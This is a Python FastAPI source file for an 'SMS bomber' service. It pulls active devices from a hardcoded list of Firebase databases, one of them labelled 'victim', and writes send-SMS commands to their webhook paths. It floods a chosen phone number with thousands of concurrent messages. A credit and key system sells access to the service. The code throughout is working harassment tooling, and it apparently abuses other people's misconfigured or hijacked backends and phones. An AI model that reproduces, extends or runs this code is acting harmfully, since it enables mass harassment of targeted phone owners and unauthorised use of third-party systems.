#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║   🔥 XIPHER ULTIMATE BOMBER API v11.0                   ║
║   ▸ Multi-Firebase | Async | 8000+ Concurrent           ║
║   ▸ Credits + Keys system built-in                      ║
║   ▸ 7 Payload formats × 12 Endpoints                    ║
║   ▸ Live progress tracking                              ║
║   ▸ Admin endpoints: add FB, gen keys, stats            ║
║   ▸ Deploy: Render / Vercel / Railway / VPS             ║
╚══════════════════════════════════════════════════════════╝
"""

import asyncio
import json
import sqlite3
import random
import string
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional
from uuid import uuid4

import httpx
from fastapi import FastAPI, Request, BackgroundTasks, HTTPException, Query, Header
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware

# ═══════════════════════════════════════════════════════════
# ⚙️ CONFIG
# ═══════════════════════════════════════════════════════════
API_NAME = "XIPHER-ULTRA"
API_VERSION = "11.0"
ADMIN_KEYS = {"xipher-admin-2025", "noobster-master"}   # Admin API keys
MAX_CONCURRENT = 8000
REQUEST_TIMEOUT = 6
CONNECT_TIMEOUT = 2
DB_PATH = "bomber_api.db"

# ═══════════════════════════════════════════════════════════
# 🔥 FIREBASE URLs — YAHAN APNE URLs DAALO
# ═══════════════════════════════════════════════════════════
FIREBASE_URLS = [
    "https://total-ocean-469810-i8-default-rtdb.firebaseio.com",
    "https://sanjay-e3c4c-default-rtdb.firebaseio.com",
    "https://rupesh-123-default-rtdb.firebaseio.com",
    "https://ueur-357f2-default-rtdb.firebaseio.com",
    "https://ladh-cb-default-rtdb.firebaseio.com",
    "https://victim-bdf8f-default-rtdb.firebaseio.com",
    "https://pinku-59a20-default-rtdb.firebaseio.com",
    "https://hardik-5a170-default-rtdb.firebaseio.com",
    "https://chutad-5eca0-default-rtdb.firebaseio.com",
    "https://ranjit-8a94c-default-rtdb.firebaseio.com",
    "https://panel-65a86-default-rtdb.firebaseio.com",
    "https://kisan10c-default-rtdb.firebaseio.com",
    "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
    "https://hush-e1f72-default-rtdb.firebaseio.com",
    "https://adsinprogess-default-rtdb.firebaseio.com",
]

# Clean + dedupe
_seen, _cleaned = set(), []
for u in FIREBASE_URLS:
    u = u.strip().rstrip("/")
    if u.endswith(".json"):
        u = u[:-5]
    if u and u not in _seen:
        _seen.add(u)
        _cleaned.append(u)
FIREBASE_URLS = _cleaned

# ═══════════════════════════════════════════════════════════
# 🎯 SEND ENDPOINTS (priority order)
# ═══════════════════════════════════════════════════════════
SEND_ENDPOINTS = [
    "clients/{id}/webhookEvent/sendSms.json",   # ✅ verified working
    "clients/{id}/webhookEvent.json",
    "clients/{id}/webhookEvent/sendSmsRequest.json",
    "clients/{id}/webhookEvent/sms.json",
    "clients/{id}/webhookEvent/send.json",
    "clients/{id}/sendSms.json",
    "clients/{id}/sms.json",
    "clients/{id}/send.json",
    "clients/{id}/message.json",
    "clients/{id}/messages.json",
    "sendSms/{id}.json",
    "sms/{id}.json",
]

# ═══════════════════════════════════════════════════════════
# 🚀 FASTAPI APP
# ═══════════════════════════════════════════════════════════
app = FastAPI(
    title=f"🔥 {API_NAME} BOMBER API",
    version=API_VERSION,
    description="Ultimate Firebase Bomber — 8000+ concurrent, multi-device",
)
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_methods=["*"],
    allow_headers=["*"],
)

# ═══════════════════════════════════════════════════════════
# 💾 DATABASE
# ═══════════════════════════════════════════════════════════
def _connect() -> sqlite3.Connection:
    conn = sqlite3.connect(DB_PATH, timeout=10.0, check_same_thread=False)
    conn.execute("PRAGMA busy_timeout=5000")
    return conn


def init_db():
    conn = _connect()
    c = conn.cursor()
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")

    c.execute("""CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY, credits INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS api_keys (
        key_string TEXT PRIMARY KEY, credits INTEGER NOT NULL,
        max_uses INTEGER NOT NULL, used_count INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)""")
    c.execute("""CREATE TABLE IF NOT EXISTS jobs (
        id TEXT PRIMARY KEY, target TEXT NOT NULL, message TEXT NOT NULL,
        status TEXT, total_sms INTEGER, delay REAL, user_id INTEGER,
        success_count INTEGER DEFAULT 0, fail_count INTEGER DEFAULT 0,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        finished_at TIMESTAMP, firebase_ids TEXT)""")

    conn.commit()
    conn.close()


init_db()

# ═══════════════════════════════════════════════════════════
# 💳 USER / CREDITS
# ═══════════════════════════════════════════════════════════
def get_credits(user_id: int) -> int:
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT credits FROM users WHERE user_id=?", (user_id,))
    row = c.fetchone()
    if row is None:
        c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
        conn.commit()
        conn.close()
        return 0
    conn.close()
    return row[0]


def deduct_credits_atomic(user_id: int, amount: int) -> bool:
    conn = _connect()
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
    c.execute(
        "UPDATE users SET credits = credits - ? WHERE user_id=? AND credits >= ?",
        (amount, user_id, amount),
    )
    ok = c.rowcount > 0
    conn.commit()
    conn.close()
    return ok


def refund_credits(user_id: int, amount: int):
    conn = _connect()
    c = conn.cursor()
    c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (amount, user_id))
    conn.commit()
    conn.close()


def gen_key(length=16) -> str:
    return "XPH-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=length))


def add_key_to_db(key: str, credits: int, max_uses: int):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT INTO api_keys (key_string, credits, max_uses) VALUES (?, ?, ?)",
        (key, credits, max_uses),
    )
    conn.commit()
    conn.close()


def redeem_key_db(key: str, user_id: int) -> Optional[int]:
    """Returns credited amount or None if invalid."""
    conn = _connect()
    c = conn.cursor()
    try:
        c.execute("BEGIN IMMEDIATE")
        c.execute("SELECT credits, max_uses, used_count FROM api_keys WHERE key_string=?", (key,))
        row = c.fetchone()
        if not row:
            conn.rollback()
            return None
        credits, max_uses, used = row
        if used >= max_uses:
            conn.rollback()
            return None
        c.execute("UPDATE api_keys SET used_count = used_count + 1 WHERE key_string=?", (key,))
        c.execute("INSERT OR IGNORE INTO users (user_id, credits) VALUES (?, 0)", (user_id,))
        c.execute("UPDATE users SET credits = credits + ? WHERE user_id=?", (credits, user_id))
        conn.commit()
        return credits
    except Exception:
        conn.rollback()
        return None
    finally:
        conn.close()


def save_job(job_id, target, message, total, delay, user_id, status, firebase_ids=""):
    conn = _connect()
    c = conn.cursor()
    c.execute(
        "INSERT INTO jobs (id, target, message, status, total_sms, delay, user_id, firebase_ids) "
        "VALUES (?,?,?,?,?,?,?,?)",
        (job_id, target, message, status, total, delay, user_id, firebase_ids),
    )
    conn.commit()
    conn.close()


def update_job(job_id, **kwargs):
    if not kwargs:
        return
    conn = _connect()
    c = conn.cursor()
    fields = ", ".join(f"{k}=?" for k in kwargs)
    vals = list(kwargs.values()) + [job_id]
    c.execute(f"UPDATE jobs SET {fields} WHERE id=?", vals)
    conn.commit()
    conn.close()


# ═══════════════════════════════════════════════════════════
# 🌐 HTTP CLIENT
# ═══════════════════════════════════════════════════════════
_http_client: Optional[httpx.AsyncClient] = None
_sem: Optional[asyncio.Semaphore] = None


def get_client() -> httpx.AsyncClient:
    global _http_client
    if _http_client is None or _http_client.is_closed:
        _http_client = httpx.AsyncClient(
            timeout=httpx.Timeout(REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT),
            limits=httpx.Limits(max_connections=2000, max_keepalive_connections=1000),
        )
    return _http_client


def get_sem() -> asyncio.Semaphore:
    global _sem
    if _sem is None:
        _sem = asyncio.Semaphore(MAX_CONCURRENT)
    return _sem


# ═══════════════════════════════════════════════════════════
# 🛠️ HELPERS
# ═══════════════════════════════════════════════════════════
def normalize_phone(raw: str) -> str:
    p = raw.strip().replace("+", "").replace(" ", "").replace("-", "")
    if p.startswith("91") and len(p) == 12:
        p = p[2:]
    if p.startswith("0") and len(p) == 11:
        p = p[1:]
    return p


def build_payloads(target: str, message: str):
    ts = int(time.time() * 1000)
    target_plus = target if target.startswith("+") else f"+91{target}"
    target_plain = target.replace("+", "")
    return [
        {"from": 1, "to": target_plain, "message": message,
         "isSended": False, "timestamp": ts},
        {"from": 1, "to": target_plus, "message": message,
         "isSended": False, "timestamp": ts},
        {"from": 1, "to": target_plus, "phone": target_plus, "number": target_plus,
         "message": message, "msg": message, "text": message, "body": message,
         "isSended": False, "status": False, "timestamp": ts},
        {"phone": target_plus, "message": message, "isSended": False, "timestamp": ts},
        {"to": target_plus, "body": message, "title": "",
         "isSended": False, "timestamp": ts},
        {"to": target_plus, "msg": message, "isSended": False},
    ]


async def fetch_devices_from(url: str) -> List[Dict]:
    base = url.rstrip("/")
    if base.endswith(".json"):
        base = base[:-5]
    try:
        async with get_sem():
            r = await get_client().get(f"{base}/clients.json")
            if r.status_code != 200:
                return []
            data = r.json()
            if not isinstance(data, dict):
                return []
            out = []
            for dev_id, info in data.items():
                if not isinstance(info, dict):
                    continue
                status = info.get("status", True)
                if status is True or status == "true" or status is None:
                    out.append({"id": dev_id, "url": base})
            return out
    except Exception:
        return []


async def get_all_devices() -> List[Dict]:
    results = await asyncio.gather(
        *[fetch_devices_from(u) for u in FIREBASE_URLS],
        return_exceptions=True,
    )
    out = []
    for r in results:
        if isinstance(r, list):
            out.extend(r)
    return out


async def send_one(device: Dict, target: str, message: str, sem: asyncio.Semaphore,
                   stats: Dict) -> bool:
    async with sem:
        payloads = build_payloads(target, message)
        base = device["url"]
        dev_id = device["id"]

        for ep_idx, ep in enumerate(SEND_ENDPOINTS):
            url = f"{base}/{ep.format(id=dev_id)}"
            tries = range(len(payloads)) if ep_idx == 0 else range(2)

            for p_idx in tries:
                payload = payloads[p_idx]

                # PUT first (verified working)
                try:
                    async with get_sem():
                        r = await get_client().put(url, json=payload)
                        if r.status_code in (200, 201, 204):
                            stats["success"] += 1
                            return True
                        if r.status_code in (401, 403):
                            stats["blocked"] += 1
                            return False
                        if r.status_code == 404:
                            break
                except Exception:
                    continue

                # POST backup
                try:
                    async with get_sem():
                        r = await get_client().post(url, json=payload)
                        if r.status_code in (200, 201, 204):
                            stats["success"] += 1
                            return True
                        if r.status_code == 404:
                            break
                except Exception:
                    continue

        stats["failed"] += 1
        return False


# ═══════════════════════════════════════════════════════════
# 💣 BOMBING WORKER
# ═══════════════════════════════════════════════════════════
async def bomb_worker(job_id: str, target: str, message: str, count: int,
                      delay: float, user_id: int):
    t0 = time.time()

    devices = await get_all_devices()
    if not devices:
        update_job(job_id, status="failed",
                   finished_at=datetime.now().isoformat())
        refund_credits(user_id, count)
        return

    ndev = len(devices)
    total = ndev * count
    print(f"\n💣 Job {job_id} | Target={target} | Devices={ndev} | Total={total}")

    update_job(job_id, status="running",
               firebase_ids=",".join(sorted({d["url"] for d in devices})))
    save_job(job_id, target, message, total, delay, user_id, "running")

    sem = asyncio.Semaphore(MAX_CONCURRENT)
    stats = {"success": 0, "failed": 0, "blocked": 0}

    tasks = []
    for device in devices:
        for _ in range(count):
            tasks.append(send_one(device, target, message, sem, stats))

    # Chunked gather for responsiveness
    chunk = 500
    for i in range(0, len(tasks), chunk):
        await asyncio.gather(*tasks[i:i + chunk], return_exceptions=True)
        if delay > 0:
            await asyncio.sleep(delay * 0.05)

    elapsed = time.time() - t0
    success = stats["success"]
    failed = stats["failed"]

    # Refund for failed
    if failed > 0:
        refund_credits(user_id, failed)

    update_job(
        job_id,
        status="completed",
        success_count=success,
        fail_count=failed,
        finished_at=datetime.now().isoformat(),
    )

    print(f"✅ Job {job_id} DONE | OK={success} FAIL={failed} | {elapsed:.1f}s")


# ═══════════════════════════════════════════════════════════
# 🌐 API ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/")
async def root():
    return {
        "api": API_NAME,
        "version": API_VERSION,
        "status": "🔥 ONLINE",
        "endpoints": {
            "bomb": "GET/POST /bomb?key=KEY&target=9876543210&message=Hi&count=10&delay=0.1",
            "balance": "GET /balance?user_id=123",
            "redeem": "GET /redeem?key=API_KEY&user_id=123",
            "job": "GET /job/{job_id}",
            "devices": "GET /devices",
            "health": "GET /health",
            "admin_genkey": "POST /admin/genkey (header X-Admin-Key)",
        },
    }


@app.get("/health")
async def health():
    return {
        "status": "ok", "api": API_NAME, "version": API_VERSION,
        "time": datetime.now().isoformat(),
    }


@app.get("/balance")
async def balance(user_id: int = Query(...)):
    return {"user_id": user_id, "credits": get_credits(user_id)}


@app.get("/redeem")
async def redeem(key: str = Query(...), user_id: int = Query(...)):
    credits = redeem_key_db(key, user_id)
    if credits is None:
        raise HTTPException(400, "Invalid or exhausted key")
    return {"success": True, "credited": credits, "balance": get_credits(user_id)}


@app.get("/devices")
async def devices():
    devs = await get_all_devices()
    by_fb = {}
    for d in devs:
        by_fb[d["url"]] = by_fb.get(d["url"], 0) + 1
    return {
        "total_online": len(devs),
        "live_firebases": len(by_fb),
        "per_firebase": by_fb,
    }


@app.api_route("/bomb", methods=["GET", "POST"])
async def bomb(request: Request, bg: BackgroundTasks):
    if request.method == "POST":
        try:
            body = await request.json()
        except Exception:
            body = {}
    else:
        body = dict(request.query_params)

    api_key = body.get("key") or request.headers.get("x-api-key", "")
    user_id_str = body.get("user_id") or request.headers.get("x-user-id", "0")

    if not api_key:
        raise HTTPException(401, "Missing key")

    try:
        user_id = int(user_id_str)
    except Exception:
        raise HTTPException(400, "Invalid user_id")

    target = normalize_phone(str(body.get("target") or body.get("number") or ""))
    message = (body.get("message") or body.get("msg") or "").strip()
    count = int(body.get("count", 1))
    delay = float(body.get("delay", 0.05))

    if not target.isdigit() or len(target) < 10:
        raise HTTPException(400, "Invalid target number")
    if not message:
        raise HTTPException(400, "Missing message")
    if count <= 0 or count > 1000:
        raise HTTPException(400, "count must be 1..1000")

    if not deduct_credits_atomic(user_id, count):
        raise HTTPException(
            402,
            f"Insufficient credits. You have {get_credits(user_id)}, need {count}",
        )

    job_id = str(uuid4())[:8]
    save_job(job_id, target, message, count, delay, user_id, "queued")
    bg.add_task(bomb_worker, job_id, target, message, count, delay, user_id)

    return {
        "success": True,
        "job_id": job_id,
        "target": target,
        "count": count,
        "delay": delay,
        "status_url": f"/job/{job_id}",
        "message": "Bomb started! Check /job/{job_id} for progress",
    }


@app.get("/job/{job_id}")
async def job_status(job_id: str):
    conn = _connect()
    conn.row_factory = sqlite3.Row
    c = conn.cursor()
    c.execute("SELECT * FROM jobs WHERE id=?", (job_id,))
    row = c.fetchone()
    conn.close()
    if not row:
        raise HTTPException(404, "Job not found")
    return dict(row)


# ═══════════════════════════════════════════════════════════
# 🛡️ ADMIN ENDPOINTS
# ═══════════════════════════════════════════════════════════
def check_admin(admin_key: str):
    if admin_key not in ADMIN_KEYS:
        raise HTTPException(403, "Invalid admin key")


@app.post("/admin/genkey")
async def admin_genkey(
    credits: int = Query(...),
    max_uses: int = Query(1),
    x_admin_key: str = Header(default=""),
):
    check_admin(x_admin_key)
    key = gen_key()
    add_key_to_db(key, credits, max_uses)
    return {"key": key, "credits": credits, "max_uses": max_uses}


@app.get("/admin/stats")
async def admin_stats(x_admin_key: str = Header(default="")):
    check_admin(x_admin_key)
    conn = _connect()
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM jobs")
    total_jobs = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM jobs WHERE status='completed'")
    completed = c.fetchone()[0]
    c.execute("SELECT SUM(success_count) FROM jobs")
    total_sms = c.fetchone()[0] or 0
    c.execute("SELECT COUNT(*) FROM users")
    users = c.fetchone()[0]
    conn.close()
    return {
        "total_jobs": total_jobs,
        "completed_jobs": completed,
        "total_sms_sent": total_sms,
        "total_users": users,
    }


@app.get("/admin/firebases")
async def admin_firebases(x_admin_key: str = Header(default="")):
    check_admin(x_admin_key)
    return {"total": len(FIREBASE_URLS), "list": FIREBASE_URLS}
